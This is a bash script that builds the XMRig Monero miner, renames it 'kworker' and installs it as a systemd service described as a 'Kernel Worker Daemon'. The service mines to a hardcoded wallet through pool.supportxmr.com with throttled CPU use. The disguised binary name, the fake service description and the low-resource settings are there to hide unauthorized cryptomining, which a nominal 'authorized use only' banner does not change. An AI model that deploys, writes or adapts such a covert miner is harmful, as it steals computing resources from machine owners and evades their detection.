#!/bin/bash

echo "🔧 Setting up Monero miner (for authorized use only)..."

# 1. System update and dependencies
sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen

# 2. Clone and build XMRig
git clone https://github.com/xmrig/xmrig.git
cd xmrig || exit
mkdir build && cd build
cmake ..
make -j$(nproc)

# 3. Set hardcoded wallet and generate random worker
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ" # Replace with YOUR real wallet
WORKER_ID="worker$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)"

# 4. Move and rename binary
sudo mv ./xmrig /usr/local/bin/kworker
sudo chmod +x /usr/local/bin/kworker

# 5. Create fake systemd service
echo "📦 Creating systemd service disguised as kernel daemon..."

sudo tee /etc/systemd/system/system-kd.service > /dev/null <<EOF
[Unit]
Description=Kernel Worker Daemon
After=network.target

[Service]
ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET.$WORKER_ID -k --tls --cpu-max-threads-hint=50 --cpu-priority=3
Restart=always
Nice=10
CPUWeight=10
IOWeight=10

[Install]
WantedBy=multi-user.target
EOF

# 6. Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable system-kd
sudo systemctl start system-kd

echo "✅ Miner running as fake system service 'system-kd.service'"
echo "🔍 Check: sudo systemctl status system-kd"
echo "🛑 Stop:  sudo systemctl stop system-kd"
